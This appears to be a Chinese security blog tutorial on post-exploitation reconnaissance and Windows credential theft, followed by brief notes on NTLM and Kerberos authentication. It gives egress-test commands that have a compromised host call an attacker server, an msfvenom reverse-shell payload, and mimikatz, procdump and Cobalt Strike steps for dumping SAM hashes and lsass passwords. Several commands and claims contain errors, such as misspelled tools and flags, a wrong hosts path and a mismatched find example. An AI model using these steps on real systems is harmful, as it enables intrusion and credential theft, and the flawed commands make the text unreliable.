---
title: "内网信息收集与 Windows 认证协议"
permalink: intranet-recon-windows-auth/
date: 2026-01-27 02:43:53
categories:
  - 网络安全
  - 内网渗透
tags:
  - 内网渗透
  - NTLM
  - Kerberos
img: /medias/featureimages/16.jpg
summary: "内网主机的常用探测命令、网络架构判断，以及 NTLM/Kerberos 认证流程与/hash 抓取基础。"
---

<!-- more -->

再通过历史漏洞，0day、钓鱼拿到 主机的shell、webshell、meterpreter、beacon、之后做的事情收集什么？

1 系统信息、权限信息、用户信息、进程信息、软件信息

2 网络信息（ip c段、端口、arp）

3  敏感信息（配置文件、密码、浏览器历史记录、命令历史记录、蓝牙、wifi、回收站）

## 系统信息
## 操作系统版本
### windows
`**systeminfo**`

### Linux
```plain
uname  -a
cat  /etc/*-release
lsb-release  -a
```

## 进程信息
### windows
```plain
tasklist
wmic  process  list  brief
```

### Linux
```plain
ps  aux
ps  -elf
top
```

## 软件信息
### windows 系统安装了那些软件
`wmic product get name,version  `（ WMIC  较新windows版本被弃用）

powershell 用：`Get-Package | Select-Object Name, Version`（ 查看已安装软件的列表和版本  ）

`Get-WmiObject -Class Win32_Product | Select-Object Name, Version`（ 使用更底层的指令  ）

### windows开机自启项
 `wmic startup get command,caption`  （ WMIC  较新windows版本被弃用）

powershell：`Get-CimInstance Win32_StartupCommand | Select-Object Name, Command`

### windows 有哪些服务
`wmic service list brief  `（ WMIC  较新windows版本被弃用）

powershell：`Get-Service | Select-Object Name, DisplayName, Status`（ 查看系统服务的简要列表  ）

### windows 有哪些计划任务
 `schtasks /query /fo LIST /v  `

###  Linux 有哪些计划任务
```plain
crontab  -l
cat  /var/spool/cron/*  (Centos)
cat  /var/spool/cron/crontab/*(kali、Ubuntu)
cat  /etc/crontab
```

## 用户权限信息
### windows
```plain
查看用户:  net  user
查看用户组：net  localgroup
查看指定用户是否为管理员：net  user  用户名
查看当前用户具体权限：whoami  /all 、whoami  /priv
```

```plain
SeDebugPrivilege                          调试程序
SeImpersonatePrivilege                    身份验证后模拟客户端

有以上两条，可以判断为管理员
```

### Linux
```plain
权限：id
查看当前用户具体权限：sudo  -l
```

## ip 地址信息收集
## IP信息
```plain
ifconfig
ipconfig
ip  a
cat /etc/host
type  C:\windows\system32\driver\etc\hosts
```

## C 端扫描
### nmap
`nmap  -sn  -PE  192.168.2.0/24`

**-sn 不扫描端口，直接进行存活探测**

**-PE 进行ping扫描**

### arp
 `地址解析协议  ：把 ip 地址转换为Mac 地址`

```plain
msf > search arp_sweep
```

### fscan、kscan
```plain
./fscan -h 192.168.2.0/24
```

## 出网判断
判断靶机是否能够联网

## TCP 出网判断
1 云服务器开个http 监听 `（python  -m  http.server）`或 tcp 监听

（`nc  -lvnp  端口）`

2 靶机执行连接 tcp 的命令，看云服务器是否有日志

```plain
curl
curl http://云服务器IP:端口

wget
wget http://云服务器IP:端口

nc
nc 云服务器IP 端口号

powershell
powershell -Command "(New-Object System.Net.WebClient).DownloadString('http://云服务器IP:端口')"
iwr -Uri http://云服务器IP:端口 -UseBasicParsing
Invoke-WebRequest 的简写

certuitl
certutil -urlcache -split -f http://云服务器IP:端口

bitsadmin
bitsadmin /transfer myJob /download /priority foreground http://云服务器IP:端口 C:\Windows\Temp\test.txt

```

## ICMP 出网判断
靶机执行

```plain
Linux：ping  -c  1  225.5.5.5
Windows: ping  -n  1  223.5.5.5
```

## DNS 出网判断
```plain
ping   -c  1  www.baidu.com
ping   -n  1  www.baidu.com
nslookup  www.baidu.com
```

## 其他敏感信息
## windows
+ **翻找文件**
+ **翻回收站**
+ **查看文件共享**

```plain
net   share
net   use
```

+ **wifi  连接信息**

```plain
netsh   wlan  show  profile

查看对应 wifi 连接记录密码
netsh   wlan   show  profile  name="无线网的名字"  key=clear
```

+  浏览器历史纪录（浏览器中保存的密码、书签、 cookie）

 https://github.com/moonD4rk/HackBrowserData

`.\hack-browser-data.exe`

## Linux
+ 历史记录

```plain
history
cat  /root/.*_history
cat  /home/*/.*_history
```

+ 查看当前登录的用户 **w**

**TTY 的值是 pts 代表是远程终端，是 空 代表是本地终端**

```plain
ttyX    本地虚拟控制台（物理终端）
pts/X   远程或图形终端（伪终端）   pts/0（SSH 登录）
-            → 后台进程
```

+ 查看用户登录记录`**last**`

`**last**`

+ 查看用户登录失败的记录`lastb`

`lastb`

+ 翻文件（find）

翻出整个操作系统中，后缀名为 .yaml的文件

```plain
find / -name "*.jpg" 2>/dev/null
```

+ 翻内容（grep）

翻出整个操作系统中，文件内容中有 password 字符的文件

 `grep -rn / "password" 2>/dev/null`

## 凭证信息获取（windows）
## windows hash
### 什么是 hash
+ **把不定长度的内容，加密成固定长度的字符**
+ **hash 不支持逆运算，经常用于签名校验**
+ **常见hash：md5、sha1、sha256、hmacsha256、crc32、sm3**

### LM hash 和 NTLM hash
+ LM hash：windows vista 后 被废弃
+ NTLM hash：windows  vista 后沿用至今

### SAM 数据库
+ 文件位置：C:\windows\system32\config\sam
+ 作用：保存windows 本地用户信息，包括用户的NTLM hash

### 获取SAM 数据库中保存的hash
⚠️ **只有管理员权限才能读取windows系统sam数据库，即使用 `whoami /priv` 能看到 `SeDebugPrivilege` 和 `SeImpersonatePrivilege` 权限**

#### 1️⃣meterpreter 读取 sam
```plain
生成木马
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.169 lport=7586 -f exe -o 123.exe
开监听
handler -p  windows/x64/meterpreter/reverse_tcp -H 192.168.2.169 -P 7586

受害者上线
```

#### 2️⃣ mimikatz 读取 sam
https://github.com/gentilkiwi/mimikatz

上传mimikatz.exe 到 靶机 、打开`mimikatz.exe  （.\mimikatz.exe）`

```plain
privilege::debug     获取windows debug权限
token::elevate       模拟windows system令牌
lsadump::sam         读取sam 数据库中保存的 NTLM hash
```

privilege::debug

#### 3️⃣保存sam 数据库到本地在读取
上传mimikatz.exe 到 靶机可能会被检测，现在不去上传 mimikatz.exe ，而是把靶机的 sam 数据 库保存下来

操作：

1 在靶机通过注册表 保存sam 数据库

```plain
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security sercurity
```

注册表：`win+R 输入 regedit`

2  把三个文件放在攻击机与 mimikatz.exe 同一文件夹中

3  攻击机打开mimikatz.exe并执行下列命令读取靶机导出的sam数据库

```plain
lsadump::sam /sam:sam /system:system /security:security
```

### 获取 lsass 进程中保存的明文密码
上述sam数据库中获取 NTLM hash 是无法逆运算的

在`windows server 2008 R2` 操作系统之前，windows 进程 lsass 默认会缓存已登录用户的明文密码

#### 1️⃣meterpreter 读取lsass 进程
⚠️ windows 最高管理员是 system 令牌

```plain
getuid
getsystem
getuid
```

```plain
meterpreter > load kiwi
```

```plain
meterpreter > creds_all
```

#### 2️⃣mimikatz 读取lsass 进程
在靶机中运行 mimikatz.exe

```plain
log  1.txt
privilege::debug
sekurlsa::logonpasswords
```

#### 3️⃣把lsass  转储进行读取
上传mimikatz.exe 到 靶机可能会被检测，现在不去上传 mimikatz.exe ，而是把靶机的 lsass 进 程保存下来

微软官方工具： procdump

https://learn.microsoft.com/en-us/sysinternals/downloads/procdump

具体操作：

#### 1  在靶机执行` procdump.exe -accpecteula -ma lsass.exe lsass.dmp`

#### 2  把导出的 lsass.dmp 传输到攻击机

#### 3  在攻击机使用 mimikatz 读取 lsass.dmp 中的明文密码
```plain
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

###  cobaltstrike 读取 sam 和 lsass
上线 beacon

```plain
hashdump
logonpasswords
```

 cobaltstrike 读取的凭据会保存下来

## windows 认证协议
## 本地认证

## 网络认证
一台windows 登录 另外一台 windows 的共享服务时，会默认使用网络认证

### challenge response 验证

## 域认证
### 域环境
工作组环境： 资源的对等的共享网络环境

域环境：由域控制器统一管理的网络环境

### 域名词
+ AD （active directory） 活动目录： 域服务的核心
+ DC （domain controller）：域控制器、域控
+ KDC (key distribution center) ： 密钥分发中心，域控默认安装
+ TGS （ticket granting server）： 票据授予服务，是 KDC的一部分
+ AS （authorization server）：授权服务，是KDC的一部分
+ domain computers ：域环境的成员主机
+ domain users：域用户
+ domain admins ：域管理员

### 域认证 （kerberos 认证）
三方认证协议，解决了域中三台主机（两个成员主机 + 一个域控）认证和授权的问题
